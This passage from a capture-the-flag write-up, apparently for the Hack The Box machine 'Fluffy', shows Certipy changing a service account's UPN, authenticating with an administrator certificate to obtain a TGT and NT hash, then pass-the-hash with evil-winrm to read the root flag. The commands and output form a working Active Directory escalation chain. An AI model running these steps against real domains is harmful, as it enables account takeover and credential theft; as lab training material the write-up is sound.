Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```
Next authenticate as user **administrator**:
```
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.62.147 -u administrator -domain fluffy.htb                                                 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@fluffy.htb'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```
## P4 & A4
Again, use **ptH** and read the root flag:
```
└─$ evil-winrm -i 10.129.62.147 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```